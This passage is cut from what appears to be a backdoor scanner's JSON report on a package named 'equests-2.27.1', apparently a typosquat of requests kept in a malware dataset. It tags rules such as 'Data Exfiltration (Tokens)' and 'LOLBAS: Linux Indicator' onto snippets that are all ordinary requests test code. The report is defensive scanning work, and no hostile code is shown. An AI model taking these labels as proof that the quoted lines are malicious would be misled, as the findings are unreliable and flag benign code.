                      "text": "    def test_basic_response(self):\n        \"\"\"the basic response server returns an empty http response\"\"\"\n        with Server.basic_response_server() as (host, port):\n            r = requests.get('http://{}:{}'.format(host, port))\n            assert r.status_code == 200\n            assert r.text == u''\n            assert r.headers['Content-Length'] == '0'\n",
                      "markdown": "`    def test_basic_response(self):\n        \"\"\"the basic response server returns an empty http response\"\"\"\n        with Server.basic_response_server() as (host, port):\n            r = requests.get('http://{}:{}'.format(host, port))\n            assert r.status_code == 200\n            assert r.text == u''\n            assert r.headers['Content-Length'] == '0'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_testserver.py"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 24,
                  "endLine": 53,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        )\n\n        with server as (host, port):\n            r = requests.get('http://{}:{}'.format(host, port))\n\n            assert r.status_code == 200\n            assert r.text == u'roflol'\n",
                    "rendered": {
                      "text": "        )\n\n        with server as (host, port):\n            r = requests.get('http://{}:{}'.format(host, port))\n\n            assert r.status_code == 200\n            assert r.text == u'roflol'\n",
                      "markdown": "`        )\n\n        with server as (host, port):\n            r = requests.get('http://{}:{}'.format(host, port))\n\n            assert r.status_code == 200\n            assert r.text == u'roflol'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_testserver.py"
                },
                "region": {
                  "startLine": 132,
                  "startColumn": 20,
                  "endLine": 132,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert server.handler_results[0] == b''\n\n    def test_request_recovery_with_bigger_timeout(self):\n        \"\"\"a biggest timeout can be specified\"\"\"\n        server = Server.basic_response_server(request_timeout=3)\n        data = b'bananadine'\n\n",
                    "rendered": {
                      "text": "        assert server.handler_results[0] == b''\n\n    def test_request_recovery_with_bigger_timeout(self):\n        \"\"\"a biggest timeout can be specified\"\"\"\n        server = Server.basic_response_server(request_timeout=3)\n        data = b'bananadine'\n\n",
                      "markdown": "`        assert server.handler_results[0] == b''\n\n    def test_request_recovery_with_bigger_timeout(self):\n        \"\"\"a biggest timeout can be specified\"\"\"\n        server = Server.basic_response_server(request_timeout=3)\n        data = b'bananadine'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_testserver.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 6,
                  "endLine": 6,
                  "snippet": {
                    "text": "\nimport threading\nimport socket\nimport time\n\nimport pytest\nimport requests\nfrom tests.testserver.server import Server\n",
                    "rendered": {
                      "text": "\nimport threading\nimport socket\nimport time\n\nimport pytest\nimport requests\nfrom tests.testserver.server import Server\n",
                      "markdown": "`\nimport threading\nimport socket\nimport time\n\nimport pytest\nimport requests\nfrom tests.testserver.server import Server\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_structures.py"
                },
                "region": {
                  "startLine": 76,
                  "startColumn": 31,
                  "endLine": 76,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n    @get_item_parameters\n    def test_get(self, key, value):\n        assert self.lookup_dict.get(key) == value\n",
                    "rendered": {
                      "text": "\n    @get_item_parameters\n    def test_get(self, key, value):\n        assert self.lookup_dict.get(key) == value\n",
                      "markdown": "`\n    @get_item_parameters\n    def test_get(self, key, value):\n        assert self.lookup_dict.get(key) == value\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 797,
                  "startColumn": 25,
                  "endLine": 797,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    \"\"\"Tests set_environ will set environ values and will restore the environ.\"\"\"\n    environ_copy = copy.deepcopy(os.environ)\n    with set_environ(env_name, value):\n        assert os.environ.get(env_name) == value\n\n    assert os.environ == environ_copy\n\n",
                    "rendered": {
                      "text": "    \"\"\"Tests set_environ will set environ values and will restore the environ.\"\"\"\n    environ_copy = copy.deepcopy(os.environ)\n    with set_environ(env_name, value):\n        assert os.environ.get(env_name) == value\n\n    assert os.environ == environ_copy\n\n",
                      "markdown": "`    \"\"\"Tests set_environ will set environ values and will restore the environ.\"\"\"\n    environ_copy = copy.deepcopy(os.environ)\n    with set_environ(env_name, value):\n        assert os.environ.get(env_name) == value\n\n    assert os.environ == environ_copy\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 373,
                  "startColumn": 19,
                  "endLine": 373,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        (\n            'http://' + ENCODED_USER + ':' + ENCODED_PASSWORD + '@' +\n            'request.com/url.html#test',\n            (USER, PASSWORD)\n        ),\n        (\n            'http://user:pass@complex.url.com/path?query=yes',\n",
                    "rendered": {
                      "text": "        (\n            'http://' + ENCODED_USER + ':' + ENCODED_PASSWORD + '@' +\n            'request.com/url.html#test',\n            (USER, PASSWORD)\n        ),\n        (\n            'http://user:pass@complex.url.com/path?query=yes',\n",
                      "markdown": "`        (\n            'http://' + ENCODED_USER + ':' + ENCODED_PASSWORD + '@' +\n            'request.com/url.html#test',\n            (USER, PASSWORD)\n        ),\n        (\n            'http://user:pass@complex.url.com/path?query=yes',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 371,
                  "startColumn": 53,
                  "endLine": 371,
                  "endColumn": 61,
                  "snippet": {
                    "text": "@pytest.mark.parametrize(\n    'url, auth', (\n        (\n            'http://' + ENCODED_USER + ':' + ENCODED_PASSWORD + '@' +\n            'request.com/url.html#test',\n            (USER, PASSWORD)\n        ),\n",
                    "rendered": {
                      "text": "@pytest.mark.parametrize(\n    'url, auth', (\n        (\n            'http://' + ENCODED_USER + ':' + ENCODED_PASSWORD + '@' +\n            'request.com/url.html#test',\n            (USER, PASSWORD)\n        ),\n",
                      "markdown": "`@pytest.mark.parametrize(\n    'url, auth', (\n        (\n            'http://' + ENCODED_USER + ':' + ENCODED_PASSWORD + '@' +\n            'request.com/url.html#test',\n            (USER, PASSWORD)\n        ),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 365,
                  "startColumn": 32,
                  "endLine": 365,
                  "endColumn": 40,
                  "snippet": {
                    "text": "\nUSER = PASSWORD = \"%!*'();:@&=+$,/?#[] \"\nENCODED_USER = compat.quote(USER, '')\nENCODED_PASSWORD = compat.quote(PASSWORD, '')\n\n\n@pytest.mark.parametrize(\n",
                    "rendered": {
                      "text": "\nUSER = PASSWORD = \"%!*'();:@&=+$,/?#[] \"\nENCODED_USER = compat.quote(USER, '')\nENCODED_PASSWORD = compat.quote(PASSWORD, '')\n\n\n@pytest.mark.parametrize(\n",
                      "markdown": "`\nUSER = PASSWORD = \"%!*'();:@&=+$,/?#[] \"\nENCODED_USER = compat.quote(USER, '')\nENCODED_PASSWORD = compat.quote(PASSWORD, '')\n\n\n@pytest.mark.parametrize(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 365,
                  "startColumn": 8,
                  "endLine": 365,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\nUSER = PASSWORD = \"%!*'();:@&=+$,/?#[] \"\nENCODED_USER = compat.quote(USER, '')\nENCODED_PASSWORD = compat.quote(PASSWORD, '')\n\n\n@pytest.mark.parametrize(\n",
                    "rendered": {
                      "text": "\nUSER = PASSWORD = \"%!*'();:@&=+$,/?#[] \"\nENCODED_USER = compat.quote(USER, '')\nENCODED_PASSWORD = compat.quote(PASSWORD, '')\n\n\n@pytest.mark.parametrize(\n",
                      "markdown": "`\nUSER = PASSWORD = \"%!*'();:@&=+$,/?#[] \"\nENCODED_USER = compat.quote(USER, '')\nENCODED_PASSWORD = compat.quote(PASSWORD, '')\n\n\n@pytest.mark.parametrize(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 363,
                  "startColumn": 7,
                  "endLine": 363,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        assert guess_json_utf(data) == expected\n\n\nUSER = PASSWORD = \"%!*'();:@&=+$,/?#[] \"\nENCODED_USER = compat.quote(USER, '')\nENCODED_PASSWORD = compat.quote(PASSWORD, '')\n\n",
                    "rendered": {
                      "text": "        assert guess_json_utf(data) == expected\n\n\nUSER = PASSWORD = \"%!*'();:@&=+$,/?#[] \"\nENCODED_USER = compat.quote(USER, '')\nENCODED_PASSWORD = compat.quote(PASSWORD, '')\n\n",
                      "markdown": "`        assert guess_json_utf(data) == expected\n\n\nUSER = PASSWORD = \"%!*'();:@&=+$,/?#[] \"\nENCODED_USER = compat.quote(USER, '')\nENCODED_PASSWORD = compat.quote(PASSWORD, '')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 797,
                  "startColumn": 18,
                  "endLine": 797,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    \"\"\"Tests set_environ will set environ values and will restore the environ.\"\"\"\n    environ_copy = copy.deepcopy(os.environ)\n    with set_environ(env_name, value):\n        assert os.environ.get(env_name) == value\n\n    assert os.environ == environ_copy\n\n",
                    "rendered": {
                      "text": "    \"\"\"Tests set_environ will set environ values and will restore the environ.\"\"\"\n    environ_copy = copy.deepcopy(os.environ)\n    with set_environ(env_name, value):\n        assert os.environ.get(env_name) == value\n\n    assert os.environ == environ_copy\n\n",
                      "markdown": "`    \"\"\"Tests set_environ will set environ values and will restore the environ.\"\"\"\n    environ_copy = copy.deepcopy(os.environ)\n    with set_environ(env_name, value):\n        assert os.environ.get(env_name) == value\n\n    assert os.environ == environ_copy\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 675,
                  "startColumn": 57,
                  "endLine": 675,
                  "endColumn": 65,
                  "snippet": {
                    "text": "            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n    a port number or auth credentials.\n    \"\"\"\n    proxy_bypass = mocker.patch('requests.utils.proxy_bypass')\n",
                    "rendered": {
                      "text": "            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n    a port number or auth credentials.\n    \"\"\"\n    proxy_bypass = mocker.patch('requests.utils.proxy_bypass')\n",
                      "markdown": "`            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n    a port number or auth credentials.\n    \"\"\"\n    proxy_bypass = mocker.patch('requests.utils.proxy_bypass')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 674,
                  "startColumn": 41,
                  "endLine": 674,
                  "endColumn": 49,
                  "snippet": {
                    "text": "            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n    a port number or auth credentials.\n    \"\"\"\n",
                    "rendered": {
                      "text": "            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n    a port number or auth credentials.\n    \"\"\"\n",
                      "markdown": "`            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n    a port number or auth credentials.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 672,
                  "startColumn": 48,
                  "endLine": 672,
                  "endColumn": 56,
                  "snippet": {
                    "text": "            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n",
                    "rendered": {
                      "text": "            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n",
                      "markdown": "`            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 672,
                  "startColumn": 31,
                  "endLine": 672,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n",
                    "rendered": {
                      "text": "            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n",
                      "markdown": "`            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 671,
                  "startColumn": 43,
                  "endLine": 671,
                  "endColumn": 51,
                  "snippet": {
                    "text": "            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n",
                    "rendered": {
                      "text": "            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n",
                      "markdown": "`            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 671,
                  "startColumn": 31,
                  "endLine": 671,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n",
                    "rendered": {
                      "text": "            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n",
                      "markdown": "`            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 670,
                  "startColumn": 39,
                  "endLine": 670,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\n",
                    "rendered": {
                      "text": "            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\n",
                      "markdown": "`            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 670,
                  "startColumn": 21,
                  "endLine": 670,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\n",
                    "rendered": {
                      "text": "            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\n",
                      "markdown": "`            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 669,
                  "startColumn": 34,
                  "endLine": 669,
                  "endColumn": 42,
                  "snippet": {
                    "text": "            ('http://172.16.1.1:5000/', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n",
                    "rendered": {
                      "text": "            ('http://172.16.1.1:5000/', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n",
                      "markdown": "`            ('http://172.16.1.1:5000/', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 669,
                  "startColumn": 21,
